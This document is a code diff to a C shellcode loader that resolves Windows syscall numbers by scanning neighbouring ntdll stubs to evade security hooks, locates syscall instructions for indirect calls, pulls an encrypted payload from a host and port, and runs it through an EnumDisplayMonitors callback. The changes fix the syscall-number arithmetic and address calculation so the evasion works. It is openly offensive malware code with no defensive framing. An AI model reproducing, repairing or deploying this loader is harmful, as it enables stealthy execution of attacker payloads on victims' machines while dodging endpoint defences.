@@ -31,9 +31,9 @@ WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
 		for (int i = 1; i <= 500; i++) {
 			PBYTE newADDR = (PBYTE)addr - i * 32;
 			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
-				BYTE high = *((PBYTE)newADDR + 5);
-				BYTE low = *((PBYTE)newADDR + 4);
-				return high;
+				BYTE high = *((PBYTE)newADDR + 4);
+				BYTE low = *((PBYTE)newADDR + 5);
+				return high + i;
 			}
 		}
 	}
@@ -42,9 +42,9 @@ WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
 		for (int i = 1; i <= 500; i++) {
 			PBYTE newADDR = (PBYTE)addr + i * 32;
 			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
-				BYTE high = *((PBYTE)newADDR + 5);
-				BYTE low = *((PBYTE)newADDR + 4);
-				return high;
+				BYTE high = *((PBYTE)newADDR + 4);
+				BYTE low = *((PBYTE)newADDR + 5);
+				return high - i;
 			}
 		}
 	}
@@ -67,7 +67,7 @@ QWORD GetSyscallAdr(HMODULE hNTDLL, char* Procedure) {
 		for (int i = 1; i <= 500; i++) {
 			PBYTE newADDR = (PBYTE)addr - i * 32;
 			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
-				LPVOID scall = (LPVOID)((INT_PTR)addr + 0x12);
+				LPVOID scall = (LPVOID)((INT_PTR)newADDR + 0x12);
 				return (QWORD)scall;
 			}
 		}
@@ -77,7 +77,7 @@ QWORD GetSyscallAdr(HMODULE hNTDLL, char* Procedure) {
 		for (int i = 1; i <= 500; i++) {
 			PBYTE newADDR = (PBYTE)addr + i * 32;
 			if (*((PBYTE)newADDR) == 0x4c && *((PBYTE)newADDR + 1) == 0x8b && *((PBYTE)newADDR + 2) == 0xd1 && *((PBYTE)newADDR + 3) == 0xb8 && *((PBYTE)newADDR + 6) == 0x00 && *((PBYTE)newADDR + 7) == 0x00) {
-				LPVOID scall = (LPVOID)((INT_PTR)addr + 0x12);
+				LPVOID scall = (LPVOID)((INT_PTR)newADDR + 0x12);
 				return (QWORD)scall;
 			}
 		}
@@ -240,8 +240,9 @@ int main(int argc, char* argv[]) {
 		char* port = "34567";
 		char LocKey[] = "key.bin";
 		char LocCipher[] = "cipher.bin";
-		PopulateData(host, port, LocKey, LocCipher);
 		Populate();
+		PopulateData(host, port, LocKey, LocCipher);
+
 #else
 		error("Provide the host, port, the key and the cipher \n%s <HOST> <PORT> <key.bin> <cipher.bin>", argv[0]);
 		return 1;
@@ -296,7 +297,7 @@ int main(int argc, char* argv[]) {
 	info("Triggering the Callback Function.");
 	ok("Injection should've been a success.");
 	//EnumWindows((WNDENUMPROC)rBuffer, 0); //Callback Function
-	//DialogBoxA(NULL, "Something", NULL, (DLGPROC)rBuffer);
+
 	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)rBuffer, 0);
 
 	info("Closing all handles");
